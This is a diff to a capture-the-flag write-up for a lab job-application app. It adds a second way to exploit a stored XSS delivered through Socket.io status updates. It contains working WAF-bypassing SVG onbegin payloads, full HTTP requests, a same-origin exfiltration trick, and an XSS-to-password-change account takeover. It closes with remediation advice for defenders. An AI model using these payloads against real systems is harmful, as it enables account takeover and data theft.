@@ -208,21 +208,23 @@ Response: `200 OK` -- WAF allows `onbegin` in status field.
 
 ## Exploitation
 
-### The Payload
+Two approaches work here -- both use the same XSS sink and delivery mechanism, but differ in how they extract the flag.
 
+### Approach 1: Data Exfiltration via /api/register (Original)
+
+**Payload:**
 ```html
 <svg><animate onbegin=fetch(`/api/flag`).then(function(r){return(r.text())}).then(function(t){fetch(`/api/register`,{method:`POST`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({username:`fl`,email:`fl@t.c`,password:`t`,full_name:t,role:`user`})})}) attributeName=x dur=1s>
 ```
 
-Key design decisions:
+Design decisions:
 - `onbegin` -- not in WAF blocklist, fires when SVG SMIL animation starts
 - Backtick template literals everywhere -- avoids quote conflicts with JSON and HTML attribute delimiters
 - `function(){}` instead of arrow functions -- avoids `>` which could close the HTML tag in unquoted attribute context
 - `return(r.text())` -- no spaces (unquoted attribute value ends at whitespace)
 - Exfiltration via `/api/register` -- creates a new user with the flag as `full_name`
 
-### Firing the Payload
-
+**Firing:**
 ```
 PUT /api/applications/6/status HTTP/1.1
 Host: lab-1772981365989-k6vumi.labs-app.bugforge.io
@@ -232,31 +234,57 @@ Cookie: token=eyJ...(recruiter1)
 {"status":"<svg><animate onbegin=fetch(`/api/flag`).then(function(r){return(r.text())}).then(function(t){fetch(`/api/register`,{method:`POST`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({username:`fl`,email:`fl@t.c`,password:`t`,full_name:t,role:`user`})})}) attributeName=x dur=1s>"}
 ```
 
-Response: `200 OK - Application status updated successfully`
-
-### Retrieving the Flag
-
+**Retrieving the flag:**
 ```
 POST /api/login
 {"username":"fl","password":"t"}
 ```
-
-Response:
 ```json
-{
-  "user": {
-    "id": 13,
-    "username": "fl",
-    "full_name": "{\"flag\":\"bug{ZrYqkblsdiZjcepapwW1JyrWeLnsNOa5}\"}"
-  }
-}
+{"user":{"id":13,"username":"fl","full_name":"{\"flag\":\"bug{ZrYqkblsdiZjcepapwW1JyrWeLnsNOa5}\"}"}}
 ```
 
-## Flag
+### Approach 2: CSRF Password Change -- Account Takeover (Better)
 
+Instead of exfiltrating the flag through a side channel, change the victim's password and log in as them directly.
+
+This works because `PUT /api/profile/password` has no CSRF protection -- it accepts `newPassword` with no current password check, and the JWT HttpOnly cookie rides along automatically from the victim's browser context.
+
+**Payload:**
+```html
+<svg><animate onbegin=fetch(`/api/profile/password`,{method:`PUT`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({newPassword:`pwned`})}) attributeName=x dur=1s>
 ```
-bug{ZrYqkblsdiZjcepapwW1JyrWeLnsNOa5}
+
+**Firing:**
 ```
+PUT /api/applications/1/status HTTP/1.1
+Host: lab-1773069866434-yktuje.labs-app.bugforge.io
+Content-Type: application/json
+Cookie: token=eyJ...(recruiter1)
+
+{"status":"<svg><animate onbegin=fetch(`/api/profile/password`,{method:`PUT`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({newPassword:`pwned`})}) attributeName=x dur=1s>"}
+```
+
+**Retrieving the flag:**
+```
+POST /api/login
+{"username":"jeremy","password":"pwned"}
+```
+```
+GET /api/flag
+Cookie: token=eyJ...(jeremy)
+```
+```json
+{"flag":"bug{r8m7uwJkrGOcXJqiQGBEWvW4cEFbtvH2}"}
+```
+
+**Why this approach is better:**
+- One fetch instead of chained promises -- simpler, fewer failure points
+- Full account takeover, not just data exfiltration
+- Works even if `/api/register` had validation, rate limiting, or was disabled
+- More realistic real-world impact -- ATO gives persistent access to everything the victim can do
+- Highlights a second vulnerability: missing CSRF protection on password change (no current password required)
+
+**Trade-off:** The original approach is stealthier -- Jeremy's password stays unchanged and there's no login anomaly in logs. For a real engagement, you'd choose based on objectives. For a CTF, the CSRF approach is objectively better.
 
 ## Attack Chain Summary
 
@@ -271,12 +299,15 @@ Jeremy's browser: showToast(data.message) renders via innerHTML
     |
     v
 SVG <animate onbegin=...> fires automatically on DOM insertion
-    |
-    v
-fetch('/api/flag') runs with jeremy's cookies (admin-level access)
-    |
-    v
-Flag exfiltrated: new user registered with flag as full_name
+    |                                    |
+    v [Approach 1]                       v [Approach 2]
+fetch('/api/flag')                  fetch('/api/profile/password')
+    |                                    |
+    v                                    v
+Exfil flag via /api/register        Jeremy's password changed to "pwned"
+as new user's full_name                  |
+                                         v
+                                    Login as jeremy, GET /api/flag
 ```
 
 ## Security Takeaways
@@ -296,12 +327,15 @@ Flag exfiltrated: new user registered with flag as full_name
 2. Socket.io `status_update` event includes unescaped status value in `data.message` -- the bridge
 3. `PUT /api/applications/:id/status` accepts arbitrary strings with no allowlist validation -- the source
 4. WAF blocklist is incomplete -- `onbegin` SVG SMIL event handler not covered
+5. `PUT /api/profile/password` has no CSRF token and no current password requirement -- enables XSS-to-ATO escalation
 
 ### Remediation
 - Use `textContent` instead of `innerHTML` in `showToast()` (or sanitize with DOMPurify)
 - Allowlist valid status values server-side: `["pending", "accepted", "rejected", "interviewing"]`
 - Add `onbegin`, `onend`, `onrepeat` to WAF blocklist (SVG SMIL events)
 - Content Security Policy with `script-src` directive to block inline JS
+- Require current password on password change endpoints
+- Add CSRF tokens to state-changing requests (or use SameSite=Strict cookies)
 
 ### Key Lessons
 1. **Delivery matters as much as payload** - we had working stored XSS payloads early but no way to deliver them to the victim. The breakthrough was finding a delivery mechanism (status updates) that auto-fires via Socket.io
@@ -309,6 +343,7 @@ Flag exfiltrated: new user registered with flag as full_name
 3. **innerHTML sinks with WebSocket/Socket.io are dangerous** - real-time notification systems often skip sanitization because developers think they control the message format
 4. **SVG SMIL events bypass many WAFs** - `onbegin`, `onend`, `onrepeat` are rarely in blocklists but fire automatically when SVG animations start
 5. **Unquoted HTML attributes need space-free payloads** - using backtick template literals and `function(){}` syntax instead of arrow functions avoids both quote conflicts and the `>` character problem
+6. **XSS + missing CSRF = full ATO** - when password change has no CSRF token and no current password check, XSS escalates from data theft to complete account takeover in a single request. Always check state-changing endpoints for CSRF protection when you have XSS
 
 ## MCP
 
